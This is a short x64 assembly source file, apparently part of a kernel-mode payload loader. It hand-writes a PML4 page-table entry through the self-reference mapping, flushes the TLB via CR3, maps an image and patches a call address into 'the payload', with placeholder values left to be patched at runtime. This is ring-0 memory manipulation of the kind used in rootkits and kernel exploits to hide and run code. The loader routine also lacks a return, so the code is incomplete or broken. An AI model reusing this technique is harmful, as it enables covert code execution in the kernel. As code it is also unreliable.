.code
LoaderASM PROC
    ; Save registers
    push rax
    push rbx
    ; Load base of self ref PML4 
    mov rbx, 0FFFFFF7FBFDFE000h

    ; Load physical address to map 
    mov rax, 0CAFEBABEDEADBEEFh  ; (to be patched)

    ; Set flags: Present=1, Write=1, Supervisor=0
    or rax, 3

    ; Write into PML4[100]
    mov [rbx + 100d * 8], rax

    ; Flush cache
    mov rbx, cr3
    mov cr3, rbx
    mov rbx, 0000327FFFE00000h   ; load the base of the image we just mapped
    mov rax, [rbx]         ; attempt to read from base as a confirmation the tables worked

    ; Setup return for payload
    call get_rip
get_rip:
    pop rax                     ; rax now contains the address right after call instruction (so somewhere in the executing page)
    and rax, 0FFFFFFFFFFFFF000h ; Align to 4KB page boundary 
    add rax, 0BABECAFEh         ; Add the runtime patched offset to the original call instruction

    add rbx, 0DEADBEEFh         ; offset for where the payload stores the original call instruction
    mov [rbx], rax              ; Write the call address to the payload storage

    ; Restore registers
    pop rbx
    pop rax
LoaderASM ENDP

ExecuteCPUID PROC
    cpuid
    ret
ExecuteCPUID ENDP

END
